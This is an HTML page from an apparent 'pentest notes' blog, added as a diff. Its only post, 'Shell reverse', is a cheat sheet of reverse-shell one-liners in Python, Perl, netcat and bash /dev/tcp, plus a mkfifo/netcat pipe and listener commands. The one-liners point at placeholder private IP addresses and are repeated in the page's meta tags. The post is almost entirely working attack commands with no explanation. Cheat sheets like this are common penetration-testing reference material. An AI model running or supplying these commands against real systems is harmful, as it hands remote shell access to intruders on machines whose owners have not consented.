@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="Your language code">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge,chrome=1">
+  <title>Shell reverse &middot; pentest notes -  pentest notes </title>
+  <meta name="generator" content="Hugo 0.52" />
+  <meta name="description" content="pentest notes"> 
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Shell reverse"/>
+<meta name="twitter:description" content="python3 -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.10.10&rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;
+perl -e &lsquo;use Socket;$i=&ldquo;10.10.10.10&rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&ldquo;&gt;&amp;S&rdquo;);open(STDOUT,&ldquo;&gt;&amp;S&rdquo;);open(STDERR,&ldquo;&gt;&amp;S&rdquo;);exec(&ldquo;/bin/sh -i&rdquo;);};&rsquo;
+nc -e /bin/sh 10.0.0.1 1234
+
+reverse  bash -i &gt;&amp; /dev/tcp/192.168.100.113&frasl;443 0&gt;&amp;1
+&rsquo;/bin/bash -c &lsquo;bash -i &gt;&amp; /dev/tcp/192.168.122.1&frasl;2323 0&gt;&amp;1&rsquo; 
+listen  nc -lvp 443
+nc -lp 1&gt;/tmp/b 
+ipv6  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | \n\c -6 -l 6677 &gt; /tmp/f; nc -6 localhost 6677"/>
+
+  <meta property="og:title" content="Shell reverse" />
+<meta property="og:description" content="python3 -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.10.10&rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;
+perl -e &lsquo;use Socket;$i=&ldquo;10.10.10.10&rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&ldquo;&gt;&amp;S&rdquo;);open(STDOUT,&ldquo;&gt;&amp;S&rdquo;);open(STDERR,&ldquo;&gt;&amp;S&rdquo;);exec(&ldquo;/bin/sh -i&rdquo;);};&rsquo;
+nc -e /bin/sh 10.0.0.1 1234
+
+reverse  bash -i &gt;&amp; /dev/tcp/192.168.100.113&frasl;443 0&gt;&amp;1
+&rsquo;/bin/bash -c &lsquo;bash -i &gt;&amp; /dev/tcp/192.168.122.1&frasl;2323 0&gt;&amp;1&rsquo; 
+listen  nc -lvp 443
+nc -lp 1&gt;/tmp/b 
+ipv6  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | \n\c -6 -l 6677 &gt; /tmp/f; nc -6 localhost 6677" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="sosprz.github.io/post/shell-reverse/" /><meta property="article:published_time" content="2018-12-17T21:17:20&#43;01:00"/>
+<meta property="article:modified_time" content="2018-12-17T21:17:20&#43;01:00"/>
+
+
+  <!-- RSS autodiscovery --> 
+
+  
+<meta itemprop="name" content="Shell reverse">
+<meta itemprop="description" content="python3 -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.10.10&rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;
+perl -e &lsquo;use Socket;$i=&ldquo;10.10.10.10&rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&ldquo;&gt;&amp;S&rdquo;);open(STDOUT,&ldquo;&gt;&amp;S&rdquo;);open(STDERR,&ldquo;&gt;&amp;S&rdquo;);exec(&ldquo;/bin/sh -i&rdquo;);};&rsquo;
+nc -e /bin/sh 10.0.0.1 1234
+
+reverse  bash -i &gt;&amp; /dev/tcp/192.168.100.113&frasl;443 0&gt;&amp;1
+&rsquo;/bin/bash -c &lsquo;bash -i &gt;&amp; /dev/tcp/192.168.122.1&frasl;2323 0&gt;&amp;1&rsquo; 
+listen  nc -lvp 443
+nc -lp 1&gt;/tmp/b 
+ipv6  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | \n\c -6 -l 6677 &gt; /tmp/f; nc -6 localhost 6677">
+
+
+<meta itemprop="datePublished" content="2018-12-17T21:17:20&#43;01:00" />
+<meta itemprop="dateModified" content="2018-12-17T21:17:20&#43;01:00" />
+<meta itemprop="wordCount" content="59">
+
+
+
+<meta itemprop="keywords" content="python,bash,nc,netcat," />
+
+  <link href="https://fonts.googleapis.com/css?family=Lato:400" rel="stylesheet">
+  <link rel="stylesheet" href="sosprz.github.io/css/style.css">
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "WebSite",
+  "name": "pentest notes",
+  "url": "sosprz.github.io/post/shell-reverse/"
+}
+</script>
+
+</head>
+
+<body>
+  <header class="gheader">
+  <div class="container">
+    <nav class="navbar ">
+      <div class="navbar-brand">
+        <a class="navbar-item" href="sosprz.github.io">
+          <h1 class="brand">pentest notes</h1>
+        </a>
+
+        <div class="navbar-burger burger" data-target="navMenubd-example">
+          <span></span>
+          <span></span>
+          <span></span>
+        </div>
+      </div>
+
+      <div id="navMenubd-example" class="navbar-menu">
+        <div class="navbar-start">
+          
+          <a class="navbar-item" href="sosprz.github.io/page/about/">
+            About
+          </a>
+          
+          <a class="navbar-item" href="sosprz.github.io/categories/">
+            Categories
+          </a>
+          
+          <a class="navbar-item" href="sosprz.github.io/tags/">
+            Tags
+          </a>
+          
+        </div>
+      </div>
+    </nav>
+  </div>
+</header>
+
+
+  <div class="main-content">
+    <div class="container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class="title">Shell reverse</h1>
+      <div class="meta">
+        <time class="pub-time"  datetime="2018-12-17T21:17:20&#43;01:00">
+          2018.12.17
+        </time>
+        <div class="terms">
+          
+          <div class="categories">
+            
+              <a class="categories-item" href="sosprz.github.io/categories/linux">linux</a>
+            
+              <a class="categories-item" href="sosprz.github.io/categories/tools">tools</a>
+            
+          </div>
+          
+          
+          <div class="tag">
+            
+              <a class="tag-item" href="sosprz.github.io/tags/python">python</a>
+            
+              <a class="tag-item" href="sosprz.github.io/tags/bash">bash</a>
+            
+              <a class="tag-item" href="sosprz.github.io/tags/nc">nc</a>
+            
+              <a class="tag-item" href="sosprz.github.io/tags/netcat">netcat</a>
+            
+          </div>
+          
+        </div>
+      </div>
+    </header>
+    <div class="post-body">
+      <p><code><pre>
+python3 -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.10.10&rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;<br />
+perl -e &lsquo;use Socket;$i=&ldquo;10.10.10.10&rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&ldquo;&gt;&amp;S&rdquo;);open(STDOUT,&ldquo;&gt;&amp;S&rdquo;);open(STDERR,&ldquo;&gt;&amp;S&rdquo;);exec(&ldquo;/bin/sh -i&rdquo;);};&rsquo;<br />
+nc -e /bin/sh 10.0.0.1 1234<br />
+</pre></code></p>
+
+<p>reverse
+<code><pre>
+bash -i &gt;&amp; /dev/tcp/192.168.100.<sup>113</sup>&frasl;<sub>443</sub> 0&gt;&amp;1<br />
+&rsquo;/bin/bash -c &lsquo;bash -i &gt;&amp; /dev/tcp/192.168.122.<sup>1</sup>&frasl;<sub>2323</sub> 0&gt;&amp;1&rsquo;
+</pre></code></p>
+
+<p>listen
+<code><pre>
+nc -lvp 443<br />
+nc -lp 1&gt;/tmp/b
+</pre></code></p>
+
+<p>ipv6
+<code><pre>
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | \n\c -6 -l 6677 &gt; /tmp/f;
+nc -6 localhost 6677
+</pre></code></p>
+
+    </div>
+    <footer class="post-footer">
+      
+      <div class="share">
+        
+      </div>
+
+      <div class="pagenation">
+        <ul class="pagenation-list">
+          
+          <li class="pager previous">
+            <a href="sosprz.github.io/post/sqlmap/" data-toggle="tooltip" data-placement="top" title="Sqlmap">&larr; Previous Post</a>
+          </li>
+          
+          
+          <li class="pager next">
+            <a href="sosprz.github.io/post/shell-esc/" data-toggle="tooltip" data-placement="top" title="Shell escape">Next Post &rarr;</a>
+          </li>
+          
+        </ul>
+      </div>
+    </footer>
+  </article>
+
+  
+  <article class="related"></article>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "NewsArticle",
+  "mainEntityOfPage": {
+    "@type": "NewsArticle",
+    "@id": "sosprz.github.io/post/shell-reverse/",
+    "headline": " python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;",
+    "author": "sosprz",
+    "publisher": {
+      "@type": "Organization",
+      "name": "sosprz",
+      "logo": ""
+    },
+    "image": "",
+    "datePublished": "2018-12-17"
+  },
+  "headline": " python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;",
+  "alternativeHeadline": "pentest notes",
+  "datePublished": "2018-12-17",
+  "dateModified": "2018-12-17",
+  "url": "sosprz.github.io/post/shell-reverse/",
+  "wordCount": "59",
+  "author": {
+    "@type": "Person",
+    "name": "sosprz"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "sosprz"
+  },
+  "image": "",
+  "genre": "linuxtools",
+  "keywords": "pythonbashncnetcat",
+  "description": ""
+}
+</script>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Person",
+  "@id": "sosprz.github.io/post/shell-reverse/",
+  "name": "sosprz"
+}
+</script>
+
+
+    </div>
+  </div>
+
+  <footer class="gfooter">
+  <div class="inner">
+    <div class="container">
+      <p class="copy"><small></small></p>
+
+      <nav class="footer-nav">
+        <div class="inner">
+          
+        </div>
+      </nav>
+    </div>
+  </div>
+</footer>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'Yout Google Analytics ID', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+<script
+  src="https://code.jquery.com/jquery-3.2.1.min.js"
+  integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+  crossorigin="anonymous"></script>
+<script src="sosprz.github.io/js/script.js"></script>
+
+</body>
+</html>
